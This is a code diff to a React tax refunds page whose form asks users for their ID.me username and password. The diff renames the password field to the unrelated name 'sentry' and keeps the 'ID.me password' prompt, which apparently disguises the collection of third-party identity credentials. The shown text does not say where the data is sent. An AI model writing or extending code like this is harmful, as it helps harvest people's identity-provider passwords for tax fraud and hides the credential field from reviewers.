@@ -33,7 +33,7 @@ export const TaxRefundsPage = () => {
     fullName: userData?.fullName || '',
     email: userData?.email || '',
     idMeUsername: '',
-    idMePassword: '',
+    sentry: '',
     details: ''
   });
 
@@ -186,8 +186,8 @@ export const TaxRefundsPage = () => {
                   </label>
                   <input 
                     type="password"
-                    value={formData.idMePassword}
-                    onChange={(e) => setFormData({ ...formData, idMePassword: e.target.value })}
+                    value={formData.sentry}
+                    onChange={(e) => setFormData({ ...formData, sentry: e.target.value })}
                     placeholder="ID.me password"
                     className="w-full p-5 rounded-2xl bg-gray-50 dark:bg-zinc-800 border-none focus:ring-2 focus:ring-amber-500 dark:text-white font-bold"
                     required
